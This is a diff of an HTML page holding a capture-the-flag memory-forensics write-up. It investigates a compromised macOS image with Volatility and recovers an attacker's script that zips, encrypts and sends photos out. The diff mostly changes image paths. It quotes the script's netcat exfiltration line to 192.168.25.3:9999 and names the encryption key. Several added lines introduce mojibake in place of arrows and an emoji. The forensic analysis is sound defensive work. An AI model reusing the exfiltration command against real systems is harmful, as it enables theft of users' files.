+                <img src="../images/posts/s4nct1m0ny/qsn11.png" alt="mac_list_files Keychains directory - Hardware UUID visible in path" />
                 <p>mac_list_files Keychains directory - Hardware UUID visible in path</p>
               </div>
               <p>Output (relevant entries):</p>
@@ -1161,7 +1161,7 @@ movabs rsi, imm64  (REX.W + BE + 8-byte immediate)</code></pre>
               <h4>Key derivation</h4>
               <pre><code>Hardware UUID : 56D0245B-513D-02BD-D236-4BF7887A32FC
 SHA-256       : a477cc3fd56692115bc8ba59a9ef0bc4e6b4cdd734eecb6106f02eaa03b91655
-MD5(SHA-256)  : 8b11dd00809d0b524a4ad21575b6a5c3  ← decryption key</code></pre>
+MD5(SHA-256)  : 8b11dd00809d0b524a4ad21575b6a5c3  â† decryption key</code></pre>
 
               <hr />
 
@@ -1182,7 +1182,7 @@ decoded : /tmp/com.apple.updatesvc</code></pre>
               <pre><code>mac_lsof 2>&amp;1 | findstr "581"
 mac_bash</code></pre>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn12.png" alt="mac_lsof for PID 581 and mac_bash history" />
+                <img src="../images/posts/s4nct1m0ny/qsn12.png" alt="mac_lsof for PID 581 and mac_bash history" />
                 <p>mac_lsof for PID 581 and mac_bash history</p>
               </div>
               <p><code>mac_lsof</code> showed only <code>/dev/ttys000</code> - the reverse shell redirected I/O over the socket, leaving no file handles behind. <code>mac_bash</code> revealed the attacker's session commands: <code>ls</code>, <code>csrutil status</code>, <code>xcode-select --install</code>, <code>cd Desktop</code>. The final entry - <code>sudo osxpmem.app/osxpmem -o OSXPMem/Memcap/mem.aff4</code> - is Peter Parker capturing the memory dump after noticing the compromise.</p>
@@ -1191,7 +1191,7 @@ mac_bash</code></pre>
   --plugins=vol2\plugins -f chall\chall.raw \
   --profile=MacElCapitan_15G31x64 mac_list_files 2>&amp;1 | Select-String "tmp"</code></pre>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn14-1.png" alt="mac_list_files output for /tmp" />
+                <img src="../images/posts/s4nct1m0ny/qsn14-1.png" alt="mac_list_files output for /tmp" />
                 <p>mac_list_files output for /tmp</p>
               </div>
               <pre><code>0xffffff8028ace780  /private/tmp/dubvm20.sh
@@ -1204,7 +1204,7 @@ mac_bash</code></pre>
 779.jpeg   12,330 bytes
 780.jpeg   27,032 bytes</code></pre>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn14-2.png" alt="Extracted Spider-Man photos - 700.jpeg, 778.jpeg, 779.jpeg, 780.jpeg" />
+                <img src="../images/posts/s4nct1m0ny/qsn14-2.png" alt="Extracted Spider-Man photos - 700.jpeg, 778.jpeg, 779.jpeg, 780.jpeg" />
                 <p>Extracted Spider-Man photos - 700.jpeg, 778.jpeg, 779.jpeg, 780.jpeg</p>
               </div>
               <p>Peter Parker's Spider-Man photographs - exactly what Eddie Brock sent the service shop to steal.</p>
@@ -1219,7 +1219,7 @@ mac_bash</code></pre>
   --plugins=vol2\plugins -f chall\chall.raw \
   --profile=MacElCapitan_15G31x64 mac_dump_file -q 0xffffff8028ace780 -O extracted\dubvm20.sh</code></pre>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn15.png" alt="mac_dump_file - dubvm20.sh - 183 bytes" />
+                <img src="../images/posts/s4nct1m0ny/qsn15.png" alt="mac_dump_file - dubvm20.sh - 183 bytes" />
                 <p>mac_dump_file - dubvm20.sh - 183 bytes</p>
               </div>
               <pre><code>Wrote 183 bytes to extracted\dubvm20.sh from vnode at address ffffff8028ace780</code></pre>
@@ -1232,7 +1232,7 @@ cat /tmp/pics.enc | nc 192.168.25.3 9999</code></pre>
               <ol>
                 <li><code>cd</code> into Peter's Spider-Man photos directory</li>
                 <li>Zip all JPEGs into <code>/tmp/pics.zip</code></li>
-                <li>Encrypt with AES-256-CBC, key <code>w3_4r3_v3n0m</code> → <code>/tmp/pics.enc</code></li>
+                <li>Encrypt with AES-256-CBC, key <code>w3_4r3_v3n0m</code> â†’ <code>/tmp/pics.enc</code></li>
                 <li>Stream the encrypted archive to <code>192.168.25.3:9999</code> via netcat</li>
               </ol>
               <p><strong>Answer: <code>w3_4r3_v3n0m:9999</code></strong></p>
@@ -1280,7 +1280,7 @@ cat /tmp/pics.enc | nc 192.168.25.3 9999</code></pre>
               <h2>Author's Note</h2>
               <p>The challenge author <a href="https://x.com/gh0stkn1gh7/status/2071151481001292081" target="_blank">@gh0stkn1gh7</a> replied :)</p>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/author-reply.png" alt="Challenge author's reply on Twitter" />
+                <img src="../images/posts/s4nct1m0ny/author-reply.png" alt="Challenge author's reply on Twitter" />
               </div>
 
               <p>Check out more DFIR labs by the author: <a href="https://github.com/Azr43lKn1ght/DFIR-LABS" target="_blank">github.com/Azr43lKn1ght/DFIR-LABS</a></p>
@@ -1305,7 +1305,7 @@ cat /tmp/pics.enc | nc 192.168.25.3 9999</code></pre>
       </div>
       <div class="tray" style="display: flex; align-items: center; gap: 4px;">
         <div style="border: 1px inset #fff; background: #fff; padding: 2px 4px; font-size: 11px; color: #000; display: flex; align-items: center; width: 140px; overflow: hidden; white-space: nowrap; font-family: 'MS Sans Serif', sans-serif;">
-          <marquee scrollamount="3" id="now-playing-marquee">🎵 now playing: ruby</marquee>
+          <marquee scrollamount="3" id="now-playing-marquee">ðŸŽµ now playing: ruby</marquee>
         </div>
         <button class="btn" id="music-prev" style="padding: 1px 6px; font-size: 10px;">&#9668;</button>
         <button class="btn" id="music-toggle" style="padding: 1px 6px; font-size: 10px; font-weight: bold; width: 24px;">||</button>
